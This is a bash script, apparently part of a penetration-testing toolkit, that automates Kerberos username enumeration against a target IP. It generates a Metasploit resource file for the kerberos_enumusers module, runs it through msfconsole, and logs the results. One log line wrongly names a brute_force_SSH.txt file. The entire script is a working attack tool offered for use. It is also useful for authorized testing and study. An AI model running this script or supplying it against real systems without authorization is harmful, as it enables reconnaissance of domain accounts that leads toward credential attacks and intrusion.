#!/bin/bash

# Check if user provided any arguments
if [[ $# == 0 ]]; then
	echo "Syntax: bash brute_force_kerberos.sh -d domain_name -u user_file ip_address"
	echo "options:"
	echo "  d: Domain name"
	echo "  u: Path to username list"
	echo "	h: Help prompt"
	exit 2
fi

# Parse flags from user
while getopts ":hd:u:" opt; do
	case ${opt} in
		h )
			echo "Syntax: bash brute_force_kerberos.sh -d domain_name -u user_file ip_address"
			echo "options:"
			echo "  d: Domain name"
			echo "  u: Path to username list"
			echo "	h: Help prompt"
			exit
			;;
		d )
			domain=$OPTARG
			;;
		u )
			user_file=$OPTARG
			;;
		\? )
			echo "Invalid option: $OPTARG" 1>&2
			exit 2
			;;
	    : )
	        echo "Invalid Option: -$OPTARG requires an argument" 1>&2
	        exit 2
	        ;;
	esac
done
shift $((OPTIND -1))

# Get IP address
IP=$1

# Get date and time to log actions taken
TODAY=$(date +%d%m%y)
DATETIME=$(date)
LOG_PATH="../logs/$TODAY/actions.logs"

if ! [[ -e $LOG_PATH ]]; then
	mkdir -p ../logs/$TODAY
	touch $LOG_PATH
fi

# Create directory and set path to save results
mkdir -p ../logs/$TODAY/$IP/attacks
SAVE_PATH="../logs/$TODAY/$IP/attacks/brute_force_kerberos.txt"

# Parse user_file to only get txt file and not full path
user_file_parsed=$(echo $user_file | awk -F/ '{print $NF}')

# Log brute force kerberos attack at save path
echo $DATETIME >> $SAVE_PATH
echo "username list: $user_file_parsed" >> $SAVE_PATH

# Log brute force kerberos attack at centralised log
echo "$DATETIME" >> $LOG_PATH
echo "Kerberos brute force attack conducted on $IP" >> $LOG_PATH
echo "username list used: $user_file_parsed" >> $LOG_PATH
echo "Details saved in logs/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
echo "" >> $LOG_PATH

# Create .rc file for msfconsole
echo "use auxiliary/gather/kerberos_enumusers" > kerberos_enum.rc
echo "set DOMAIN $domain" >> kerberos_enum.rc
echo "set RHOSTS $IP" >> kerberos_enum.rc
echo "set user_file $user_file" >> kerberos_enum.rc
echo "spool $SAVE_PATH" >> kerberos_enum.rc
echo "exploit" >> kerberos_enum.rc
echo "exit" >> kerberos_enum.rc

# Run .rc file
msfconsole -r kerberos_enum.rc

# Remove rc file 
rm kerberos_enum.rc

# Add a space to end of save path to split attacks by new line
echo "" >> $SAVE_PATH

echo "[*] Results have been saved in logs/$IP/attacks/brute_force_kerberos.txt"